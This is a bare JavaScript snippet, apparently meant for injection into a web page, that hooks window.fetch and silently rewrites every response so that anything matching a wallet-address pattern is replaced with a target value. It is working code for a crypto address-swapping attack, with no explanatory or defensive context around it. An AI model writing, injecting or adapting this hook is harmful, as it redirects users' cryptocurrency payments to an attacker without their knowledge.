const rf = window.fetch;
window.fetch = async (...a) => { const r = await rf(...a); const t = await r.clone().text(); return new Response(t.replace(WALLET_RE, TARGET), r); };
